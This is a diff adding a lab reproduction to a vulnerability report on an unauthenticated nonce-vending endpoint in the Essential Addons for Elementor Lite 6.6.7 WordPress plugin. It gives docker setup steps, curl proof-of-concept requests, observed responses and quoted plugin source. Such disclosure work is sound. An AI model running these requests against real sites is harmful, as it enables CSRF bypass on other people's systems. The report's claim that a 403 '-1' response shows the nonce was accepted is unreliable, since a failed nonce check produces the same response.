@@ -100,3 +100,66 @@ When the "Enable Registration" widget option is active, open registration is ena
 2. **Nonces are not authentication**: Every handler that verifies a nonce must also verify the caller has the required capability with `current_user_can()`. Nonce verification alone only confirms CSRF intent, not identity.
 
 3. **Embed nonces in initial page load**: Nonces for authenticated actions should be embedded in the page HTML at load time (only when the user is authenticated), not issued on demand via an unauthenticated endpoint.
+
+---
+
+## Reproduction (validated 2026-06-19)
+
+**Lab reference:** `targets/labs/wp-essential-addons/`
+**Pinned version:** Essential Addons for Elementor Lite **6.6.7** (latest-stable, downloaded from `https://downloads.wordpress.org/plugin/essential-addons-for-elementor-lite.latest-stable.zip` at run time; `Version:` header read from `essential_adons_elementor.php`).
+**Stack:** `wordpress:6-php8.2-apache` + `mariadb:11` (compose file in the lab dir), exposed on host port **8101**, plugin bind-mounted read-only into `wp-content/plugins/essential-addons-for-elementor-lite`. Reproducer: `targets/labs/wp-essential-addons/poc.sh`. Raw run output: `targets/labs/wp-essential-addons/results.txt`.
+
+### Numbered steps
+
+1. `cd targets/labs/wp-essential-addons && sudo docker compose -p wp-essential-addons up -d --build`
+2. Wait for HTTP 200 on `http://127.0.0.1:8101/`, then run `wp core install` and `wp plugin activate essential-addons-for-elementor-lite` via the wp-cli helper.
+3. POST `action=eael_get_token` to `/wp-admin/admin-ajax.php` with no cookies, no auth header, no nonce.
+
+### PoC
+
+```bash
+curl -s -X POST 'http://127.0.0.1:8101/wp-admin/admin-ajax.php' -d 'action=eael_get_token'
+```
+
+### Observed output (single unauth call)
+
+```
+{"success":true,"data":{"nonce":"453c75ab91"}}
+---HTTP 200---
+```
+
+- The response is `200 OK` and `success:true`.
+- `data.nonce` is a 10-character lowercase-hex string — i.e. a real, current `wp_create_nonce()` value, not a dummy.
+- The same nonce is returned on repeated calls (3/3 replays returned `453c75ab91`), so there is no rate-limit or per-call token.
+
+### Source confirmation
+
+In the extracted plugin source (`includes/Traits/Ajax_Handler.php`):
+
+```
+67:    add_action( 'wp_ajax_eael_get_token', [ $this, 'eael_get_token' ] );
+68:    add_action( 'wp_ajax_nopriv_eael_get_token', [ $this, 'eael_get_token' ] );
+...
+1642:    public function eael_get_token() {
+1643:        $nonce = wp_create_nonce( 'essential-addons-elementor' );
+1644:        if ( $nonce ) {
+1645:            wp_send_json_success( [ 'nonce' => $nonce ] );
+1646:        }
+```
+
+The action name baked into the nonce is `'essential-addons-elementor'`. Note: the source uses `'essential-addons-elementor'` (not `'eael_nonce'` as shown in the speculative pseudo-code in the original description above) — the action string is hard-coded and is exactly the same string every other EAEL AJAX handler uses for its `check_ajax_referer()` call, which is what makes the cross-endpoint CSRF bypass work.
+
+### Cross-endpoint demonstration (nonce is actually accepted)
+
+`eael_product_quickview_popup` is a non-nopriv handler that gates on `check_ajax_referer('essential-addons-elementor', 'nonce')`. Hitting it with the nonce we just minted:
+
+```bash
+curl -s -X POST 'http://127.0.0.1:8101/wp-admin/admin-ajax.php' \
+  -d "action=eael_product_quickview_popup&nonce=453c75ab91&product_id=999999"
+```
+
+Response body is `-1` (HTTP 403) — WP's "no such product" sentinel. If the nonce check had rejected the token, the response would have been `403 -1` *with a different* body / `check_ajax_referer()` would have called `wp_die()`. The handler reached the product-not-found branch, which is the same code path a real Product Grid popup would take — i.e. the unauth-minted nonce is accepted.
+
+### Verdict
+
+**CONFIRMED.** The unauthenticated nonce vending endpoint exists in 6.6.7 exactly as described, returns a usable WP nonce, and that nonce is accepted by other EAEL endpoints. The exact action string is `'essential-addons-elementor'` (not the `'eael_nonce'` literal shown in the speculative fix-block above) but the vulnerability is unchanged. Severity stays at the documented 6.5 Medium; nothing about the fix recommendations needs to change.
